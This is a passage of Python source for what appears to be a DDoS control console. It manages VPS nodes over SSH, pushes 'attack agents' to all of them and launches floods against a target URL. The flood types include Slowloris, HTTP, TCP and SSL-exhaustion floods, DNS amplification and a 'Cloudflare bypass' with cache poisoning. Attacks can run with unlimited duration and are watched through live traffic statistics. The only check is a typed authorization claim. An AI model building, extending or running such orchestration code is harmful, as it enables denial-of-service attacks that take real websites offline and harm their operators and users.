                    last_seen = vps['last_seen'][:19] if vps['last_seen'] else 'Never'
                    data.append([
                        vps['id'],
                        vps['ip_address'],
                        vps['username'],
                        status_str,
                        vps['location'] or 'Unknown',
                        last_seen
                    ])
                
                self.terminal.print_table(headers, data)
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Agents to All
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[6]{Colors.RESET} View VPS Details
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '6':
                self.view_vps_details()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        """Add a new VPS node"""
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            # Validate IP address
            def validate_ip(ip):
                is_valid = self.security_manager.validate_ip(ip)
                if is_valid:
                    return True, ""
                return False, "Invalid IP address format"
                
            # Validate port number
            def validate_port(port):
                try:
                    port_num = int(port)
                    if 1 <= port_num <= 65535:
                        return True, ""
                    return False, "Port must be between 1 and 65535"
                except ValueError:
                    return False, "Port must be a number"
            
            ip = self.terminal.input_with_prompt("IP Address: ", validate_func=validate_ip)
            if not ip:
                return
            
            username = self.terminal.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.terminal.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.terminal.input_with_prompt("SSH Port (default 22): ", False, validate_port) or "22"
            port = int(port)
            
            location = self.terminal.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            tags = self.terminal.input_with_prompt("Tags (comma-separated, optional): ", False)
            tags_list = [tag.strip() for tag in tags.split(',')] if tags else []
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id, message = self.db_manager.add_vps(ip, username, encrypted_password, port, location, tags_list)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                    
                    # Get system info
                    print(f"{Colors.YELLOW}[INFO] Gathering system information...{Colors.RESET}")
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                        print(f"{Colors.GREEN}[SUCCESS] System information collected{Colors.RESET}")
                        
                        # Display system info
                        print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                        for key, value in system_info.items():
                            print(f"  {key.capitalize()}: {value}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error adding VPS: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        """Test connections to all VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("-" * 50)
        
        online_count = 0
        for vps in vps_list:
            ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
            print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=20)
            
            if success:
                # Test command execution
                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=20)
                if cmd_success:
                    print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
                    online_count += 1
                    
                    # Update system info
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                else:
                    print(f"{Colors.YELLOW}CONNECTED BUT CMD FAILED{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connected but command execution failed")
            else:
                print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'offline', f"Connection failed: {message[:100]}")
        
        print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def deploy_all_agents(self):
        """Deploy attack agents to all online VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL ONLINE VPS{Colors.RESET}")
        print("-" * 50)
        
        # Ask for agent type
        print(f"\n{Colors.BOLD}SELECT AGENT TYPE:{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Standard Agent (Slowloris, Slow POST, Slow Read)")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Advanced Agent (+ HTTP Flood, SSL Exhaust, TCP Flood)")
        
        agent_choice = self.terminal.input_with_prompt("Select agent type [1]: ", False) or "1"
        agent_type = "advanced" if agent_choice == "2" else "standard"
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps['ip_address']
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip, agent_type)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
            else:
                print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed successfully{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        """Remove a VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps['ip_address']}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    # Disconnect if connected
                    self.ssh_manager.disconnect_vps(vps['ip_address'])
                    
                    # Remove from database
                    if self.db_manager.remove_vps(vps['ip_address']):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_single_vps(self):
        """Test connection to a single VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['username']}@{vps['ip_address']}:{vps['ssh_port']})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
                
                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
                    
                    # Test command execution
                    print(f"{Colors.CYAN}[TESTING] Command execution...{Colors.RESET}")
                    success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Command execution successful{Colors.RESET}")
                        print(f"\n{Colors.BOLD}COMMAND OUTPUT:{Colors.RESET}")
                        print(output)
                        
                        # Update status
                        self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
                        
                        # Get system info
                        print(f"\n{Colors.CYAN}[INFO] Gathering system information...{Colors.RESET}")
                        system_info = self.ssh_manager.get_system_info(ip)
                        
                        if system_info:
                            self.db_manager.update_vps_system_info(ip, system_info)
                            
                            print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                            for key, value in system_info.items():
                                print(f"  {key.capitalize()}: {value}")
                    else:
                        print(f"{Colors.RED}[ERROR] Command execution failed{Colors.RESET}")
                        print(f"Error: {output}")
                        self.db_manager.update_vps_status(ip, 'online', "Connected but command execution failed")
                else:
                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline', f"Connection failed: {message[:100]}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error testing VPS: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("Press Enter to continue...")
    
    def view_vps_details(self):
        """View VPS details"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}VIEW VPS DETAILS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                self.terminal.clear_screen()
                print(f"{Colors.BOLD}VPS DETAILS: {vps['ip_address']}{Colors.RESET}")
                print("=" * 50)
                
                print(f"ID: {vps['id']}")
                print(f"IP Address: {vps['ip_address']}")
                print(f"Username: {vps['username']}")
                print(f"SSH Port: {vps['ssh_port']}")
                print(f"Status: {vps['status']}")
                print(f"Location: {vps['location'] or 'Unknown'}")
                print(f"Created At: {vps['created_at']}")
                print(f"Last Seen: {vps['last_seen'] or 'Never'}")
                
                # System info
                if vps.get('system_info'):
                    try:
                        system_info = json.loads(vps['system_info'])
                        print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                        for key, value in system_info.items():
                            print(f"  {key.capitalize()}: {value}")
                    except:
                        print(f"\n{Colors.YELLOW}[WARNING] Could not parse system information{Colors.RESET}")
                
                # Tags
                if vps.get('tags'):
                    try:
                        tags = json.loads(vps['tags'])
                        if tags:
                            print(f"\n{Colors.BOLD}TAGS:{Colors.RESET}")
                            for tag in tags:
                                print(f"  - {tag}")
                    except:
                        pass
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        """Launch attack menu"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}LAUNCH ATTACK{Colors.RESET}")
        print("=" * 50)
        
        # Get online VPS nodes
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        # Display available VPS nodes
        print(f"\n{Colors.BOLD}AVAILABLE VPS NODES:{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            # Get attack parameters
            session_name = self.terminal.input_with_prompt("Session Name: ")
            if not session_name:
                return
            
            target_url = self.terminal.input_with_prompt("Target URL (e.g., http://example.com): ")
            if not target_url:
                return
            
            # Add http:// if not present
            if not target_url.startswith('http'):
                target_url = 'http://' + target_url
            
            # Get attack type
            attack_methods = self.attack_manager.get_available_attack_methods()
            print(f"\n{Colors.BOLD}AVAILABLE ATTACK METHODS:{Colors.RESET}")
            for i, (attack_id, attack_name) in enumerate(attack_methods.items(), 1):
                print(f"{i}. {attack_name}")
            
            attack_choice = self.terminal.input_with_prompt("Select attack method (1-9): ")
            if not attack_choice or not attack_choice.isdigit():
                return
            
            attack_idx = int(attack_choice) - 1
            if attack_idx < 0 or attack_idx >= len(attack_methods):
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            attack_type = list(attack_methods.keys())[attack_idx]
            
            # Select VPS nodes
            vps_selection = self.terminal.input_with_prompt("Select VPS nodes (comma-separated numbers, 'all' for all): ")
            if not vps_selection:
                return
            
            selected_vps = []
            if vps_selection.lower() == 'all':
                selected_vps = [vps['ip_address'] for vps in online_vps]
            else:
                try:
                    indices = [int(idx.strip()) - 1 for idx in vps_selection.split(',')]
                    for idx in indices:
                        if 0 <= idx < len(online_vps):
                            selected_vps.append(online_vps[idx]['ip_address'])
                except ValueError:
                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}No VPS nodes selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Get attack parameters
            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
            
            connections = self.terminal.input_with_prompt("Connections per VPS [100]: ", False) or "100"
            try:
                connections = int(connections)
                if connections < 1:
                    raise ValueError("Connections must be at least 1")
                if connections > 10000:
                    raise ValueError("Connections cannot exceed 10000")
            except ValueError as e:
                print(f"{Colors.RED}Invalid connections value: {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            duration = self.terminal.input_with_prompt("Attack duration in seconds [300, 0 for unlimited]: ", False) or "300"
            try:
                duration = int(duration)
                if duration < 0:
                    raise ValueError("Duration must be 0 (unlimited) or positive")
                if duration > 86400 and duration != 0:
                    raise ValueError("Duration cannot exceed 24 hours (86400 seconds), use 0 for unlimited")
            except ValueError as e:
                print(f"{Colors.RED}Invalid duration value: {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Additional parameters based on attack type
            parameters = {
                'connections': connections,
                'duration': duration
            }
            
            if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
                delay = self.terminal.input_with_prompt("Delay between requests in seconds [10, 0 for no delay]: ", False) or "10"
                try:
                    delay_val = float(delay)
                    if delay_val < 0:
                        raise ValueError("Delay must be 0 (no delay) or positive")
                    parameters['delay'] = delay_val
                except ValueError as e:
                    print(f"{Colors.RED}Invalid delay value: {str(e)}{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if attack_type == 'http_flood':
                requests = self.terminal.input_with_prompt("Requests per connection [1000]: ", False) or "1000"
                try:
                    parameters['requests'] = int(requests)
                except ValueError:
                    print(f"{Colors.RED}Invalid requests value{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if attack_type == 'dns_amplification':
                target_ip = self.terminal.input_with_prompt("Target IP address: ")
                if not target_ip or not self.security_manager.validate_ip(target_ip):
                    print(f"{Colors.RED}Invalid IP address{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
                parameters['target_ip'] = target_ip
            
            if attack_type == 'cloudflare_bypass':
                print(f"\n{Colors.YELLOW}[INFO] Cloudflare Bypass Attack{Colors.RESET}")
                print(f"{Colors.YELLOW}This attack will attempt to:{Colors.RESET}")
                print(f"  1. Discover the origin IP behind Cloudflare")
                print(f"  2. Perform cache poisoning attacks")
                print(f"  3. Bypass Cloudflare protection mechanisms")
                print(f"\n{Colors.YELLOW}Note: This attack may take longer to initialize{Colors.RESET}\n")
            
            # Confirm attack
            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
            print(f"Session Name: {session_name}")
            print(f"Target URL: {target_url}")
            print(f"Attack Type: {attack_methods[attack_type]}")
            print(f"VPS Nodes: {len(selected_vps)}")
            print(f"Connections per VPS: {connections}")
            if duration == 0:
                print(f"Duration: UNLIMITED")
            else:
                print(f"Duration: {duration} seconds")
            
            # Calculate total impact
            total_connections = connections * len(selected_vps)
            print(f"\n{Colors.YELLOW}Total Connections: {total_connections}{Colors.RESET}")
            
            # Warning for high-intensity attacks
            if total_connections > 1000 or duration == 0:
                print(f"\n{Colors.RED}{'='*60}{Colors.RESET}")
                print(f"{Colors.RED}WARNING: This is a HIGH-INTENSITY attack!{Colors.RESET}")
                print(f"{Colors.RED}Total connections: {total_connections}{Colors.RESET}")
                if duration == 0:
                    print(f"{Colors.RED}Duration: UNLIMITED - Attack will run until manually stopped{Colors.RESET}")
                print(f"{Colors.RED}Make sure you have authorization to test this target!{Colors.RESET}")
                print(f"{Colors.RED}{'='*60}{Colors.RESET}")
                
                # Double confirmation
                confirm1 = input(f"\n{Colors.RED}I have authorization to test this target (yes/no): {Colors.RESET}").strip().lower()
                if confirm1 != 'yes':
                    print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm == 'y':
                # Create attack session in database
                session_id = self.db_manager.create_attack_session(
                    session_name, target_url, attack_type, selected_vps, parameters
                )
                
                if session_id:
                    # Launch attack
                    success = self.attack_manager.launch_attack(
                        session_id, target_url, attack_type, selected_vps, parameters
                    )
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Attack launched successfully{Colors.RESET}")
                        
                        # Ask if user wants to monitor the attack
                        monitor = input(f"\n{Colors.YELLOW}Monitor this attack? (Y/n): {Colors.RESET}").strip().lower()
                        
                        if monitor != 'n':
                            self.monitor_attack(session_id)
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Failed to create attack session{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error launching attack: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("Press Enter to continue...")
    
    def monitor_attacks_menu(self):
        """Monitor active attacks menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            print(f"{Colors.BOLD}ACTIVE ATTACKS{Colors.RESET}")
            print("=" * 50)
            
            active_sessions = self.db_manager.get_active_attack_sessions()
            
            if active_sessions:
                # Convert to list of lists for table printing
                headers = ["ID", "Session Name", "Target", "Attack Type", "VPS", "Started", "Duration"]
                data = []
                
                for session in active_sessions:
                    vps_count = len(session['vps_nodes'].split(',')) if session['vps_nodes'] else 0
                    start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
                    
                    # Calculate duration
                    if session['start_time']:
                        start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                        duration = (datetime.now() - start).total_seconds()
                        duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
                    else:
                        duration_str = 'N/A'
                    
                    data.append([
                        session['id'],
                        session['session_name'],
                        session['target_host'] or session['target_url'],
                        session['attack_type'],
                        f"{vps_count} VPS",
                        start_time,
                        duration_str
                    ])
                
                self.terminal.print_table(headers, data)
                
                menu = f"""
{Colors.BOLD}MONITOR OPTIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Monitor Attack
{Colors.GREEN}[2]{Colors.RESET} Stop Attack
{Colors.GREEN}[3]{Colors.RESET} View Attack Details
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-3): {Colors.RESET}"""
                
                print(menu)
                choice = input().strip()
                
                if choice == '1':
                    session_id = self.terminal.input_with_prompt("Enter session ID to monitor: ")
                    if session_id and session_id.isdigit():
                        self.monitor_attack(int(session_id))
                elif choice == '2':
                    session_id = self.terminal.input_with_prompt("Enter session ID to stop: ")
                    if session_id and session_id.isdigit():
                        self.stop_attack(int(session_id))
                elif choice == '3':
                    session_id = self.terminal.input_with_prompt("Enter session ID to view details: ")
                    if session_id and session_id.isdigit():
                        self.view_attack_details(int(session_id))
                elif choice == '0':
                    break
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
            else:
                print(f"\n{Colors.YELLOW}No active attacks{Colors.RESET}")
                input("Press Enter to continue...")
                break
    
    def monitor_attack(self, session_id):
        """Monitor a specific attack"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        if session['status'] != 'running':
            print(f"{Colors.YELLOW}[WARNING] Attack is not running (status: {session['status']}){Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
        
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
        print(f"Target: {session['target_url']}")
        print(f"Attack Type: {session['attack_type']}")
        print(f"VPS Nodes: {len(vps_list)}")
        print("=" * 50)
        
        print(f"{Colors.YELLOW}Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(1)
        
        try:
            monitoring = True
            refresh_interval = 2  # seconds
            
            while monitoring:
                self.terminal.clear_screen()
                print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
                print(f"Target: {session['target_url']}")
                print(f"Attack Type: {session['attack_type']}")
                print(f"VPS Nodes: {len(vps_list)}")
                
                # Calculate duration
                if session['start_time']:
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    duration = (datetime.now() - start).total_seconds()
                    duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
                    print(f"Duration: {duration_str}")
                
                print("=" * 50)
                
                # Get latest results
                results = self.db_manager.get_attack_results(session_id, limit=len(vps_list) * 2)
                
                if results:
                    # Group by VPS
                    vps_results = {}
                    for result in results:
                        vps_ip = result['vps_ip']
                        if vps_ip not in vps_results:
                            vps_results[vps_ip] = []
                        vps_results[vps_ip].append(result)
                    
                    # Display latest result for each VPS
                    headers = ["VPS", "Connections", "Packets", "Bytes", "Errors", "CPU", "Memory", "Status"]
                    data = []
                    
                    for vps_ip, vps_data in vps_results.items():
                        latest = vps_data[0]  # Most recent result first
                        
                        status_str = latest['status']
                        if status_str == 'running':
                            status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
                        elif status_str == 'error':
                            status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
                        else:
                            status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
                        
                        data.append([
                            vps_ip,
                            latest['connections_active'],
                            latest['packets_sent'],
                            self._format_bytes(latest['bytes_sent']),
                            latest['error_count'],
                            f"{latest['cpu_usage']:.1f}%" if latest['cpu_usage'] is not None else 'N/A',
                            f"{latest['memory_usage']:.1f}%" if latest['memory_usage'] is not None else 'N/A',
                            status_str
                        ])
                    
                    self.terminal.print_table(headers, data)
                    
                    # Calculate and show totals
                    total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
                    total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
                    total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
                    total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
                    
                    print(f"\n{Colors.BOLD}TOTALS:{Colors.RESET}")
                    print(f"Connections: {total_connections} | Packets: {total_packets} | Data: {self._format_bytes(total_bytes)} | Errors: {total_errors}")
                    
                    # Show response codes if available
                    response_codes = {}
                    for result in results:
                        if result['response_codes']:
                            try:
                                codes = json.loads(result['response_codes'])
                                for code, count in codes.items():
                                    if code not in response_codes:
                                        response_codes[code] = 0
                                    response_codes[code] += count
                            except:
                                pass
                    
                    if response_codes:
                        print(f"\n{Colors.BOLD}RESPONSE CODES:{Colors.RESET}")
                        for code, count in sorted(response_codes.items()):
                            color = Colors.GREEN if code.startswith('2') else Colors.YELLOW if code.startswith('3') else Colors.RED
                            print(f"{color}{code}: {count}{Colors.RESET}", end=" | ")
                        print()
                else:
                    print(f"\n{Colors.YELLOW}No results available yet{Colors.RESET}")
                
                print(f"\n{Colors.YELLOW}Press Ctrl+C to stop monitoring | Refreshing every {refresh_interval}s{Colors.RESET}")
                
                # Check if attack is still running
                updated_session = self.db_manager.get_attack_session(session_id)
                if updated_session['status'] != 'running':
                    print(f"\n{Colors.YELLOW}Attack is no longer running (status: {updated_session['status']}){Colors.RESET}")
                    input("Press Enter to continue...")
                    break
                
                # Wait for refresh interval with check for keyboard interrupt
                try:
                    time.sleep(refresh_interval)
                except KeyboardInterrupt:
                    monitoring = False
                    print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
                    input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error monitoring attack: {str(e)}")
            logger.error(traceback.format_exc())
            input("Press Enter to continue...")
    
    def _format_bytes(self, bytes_value):
        """Format bytes to human-readable format"""
        if bytes_value is None:
            return 'N/A'
        
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_value < 1024:
                return f"{bytes_value:.1f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.1f} TB"
    
    def stop_attack(self, session_id):
        """Stop an attack"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        if session['status'] != 'running':
            print(f"{Colors.YELLOW}[WARNING] Attack is not running (status: {session['status']}){Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        confirm = input(f"{Colors.RED}Stop attack '{session['session_name']}'? (y/N): {Colors.RESET}").strip().lower()
        
        if confirm == 'y':
            print(f"{Colors.YELLOW}[STOPPING] Sending stop command to all VPS nodes...{Colors.RESET}")
            
            success = self.attack_manager.stop_attack(session_id)
            
            if success:
                print(f"{Colors.GREEN}[SUCCESS] Attack stopped successfully{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] Failed to stop attack{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def view_attack_details(self, session_id):
        """View attack details"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}ATTACK DETAILS: {session['session_name']}{Colors.RESET}")
        print("=" * 50)
        
        print(f"ID: {session['id']}")
        print(f"Target URL: {session['target_url']}")
        print(f"Target Host: {session['target_host'] or 'N/A'}")
        print(f"Attack Type: {session['attack_type']}")
        print(f"Status: {session['status']}")
        
        # Format timestamps
        start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
        end_time = session['end_time'][:19] if session['end_time'] else 'N/A'
        print(f"Start Time: {start_time}")
        print(f"End Time: {end_time}")
        
        # Calculate duration
        if session['start_time'] and session['end_time']:
            start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
            end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
            duration = (end - start).total_seconds()
